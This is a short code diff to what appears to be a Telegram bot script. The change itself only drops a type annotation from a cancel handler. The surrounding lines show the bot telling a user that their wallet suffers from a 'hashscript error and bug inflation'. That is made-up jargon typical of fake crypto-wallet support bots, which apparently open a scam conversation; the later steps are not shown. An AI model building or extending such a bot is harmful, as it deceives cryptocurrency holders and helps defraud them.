@@ -33,7 +33,7 @@ def first_question_step(message):
     msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
     bot.register_next_step_handler(msg, second_step)
 
-def cancel(update: Update, context: CallbackContext):
+def cancel(update, context: CallbackContext):
      chat_id = update.message.chat_id
      bot.send_message(chat_id , text = "process canceled !")
      return ConversationHandler.END
